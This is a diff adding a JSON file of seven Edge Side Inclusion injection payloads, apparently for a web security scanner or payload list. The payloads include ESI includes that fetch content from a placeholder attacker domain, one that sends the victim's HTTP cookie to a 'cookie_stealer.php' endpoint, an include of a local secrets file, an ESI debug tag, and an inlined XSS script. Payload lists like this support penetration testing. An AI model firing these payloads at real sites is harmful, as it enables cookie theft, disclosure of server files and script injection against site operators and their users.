@@ -1,0 +1,65 @@
+[
+  {
+    "id": "ssi-injection-1",
+    "title": "Edge Side Inclusion",
+    "payload": "Surrogate-Control: content=\"ESI/1.0\"",
+    "context": "Edge Side Inclusion",
+    "tags": [
+      "ssi-injection"
+    ]
+  },
+  {
+    "id": "ssi-injection-2",
+    "title": "Edge Side Inclusion",
+    "payload": "<esi:include src=http://[ATTACKER.DOMAIN.TLD]>",
+    "context": "Edge Side Inclusion",
+    "tags": [
+      "ssi-injection"
+    ]
+  },
+  {
+    "id": "ssi-injection-3",
+    "title": "Edge Side Inclusion",
+    "payload": "<esi:include src=http://[ATTACKER.DOMAIN.TLD]/XSSPAYLOAD.html>",
+    "context": "Edge Side Inclusion",
+    "tags": [
+      "ssi-injection"
+    ]
+  },
+  {
+    "id": "ssi-injection-4",
+    "title": "Edge Side Inclusion",
+    "payload": "<esi:include src=http://[ATTACKER.DOMAIN.TLD]/?cookie_stealer.php?=$(HTTP_COOKIE)>",
+    "context": "Edge Side Inclusion",
+    "tags": [
+      "ssi-injection"
+    ]
+  },
+  {
+    "id": "ssi-injection-5",
+    "title": "Edge Side Inclusion",
+    "payload": "<esi:include src=\"supersecret.txt\">",
+    "context": "Edge Side Inclusion",
+    "tags": [
+      "ssi-injection"
+    ]
+  },
+  {
+    "id": "ssi-injection-6",
+    "title": "Edge Side Inclusion",
+    "payload": "<esi:debug/>",
+    "context": "Edge Side Inclusion",
+    "tags": [
+      "ssi-injection"
+    ]
+  },
+  {
+    "id": "ssi-injection-7",
+    "title": "Edge Side Inclusion",
+    "payload": "<esi:inline name=\"/attack.html\" fetchable=\"yes\"><script>prompt('XSS')</script></esi:inline>",
+    "context": "Edge Side Inclusion",
+    "tags": [
+      "ssi-injection"
+    ]
+  }
+]
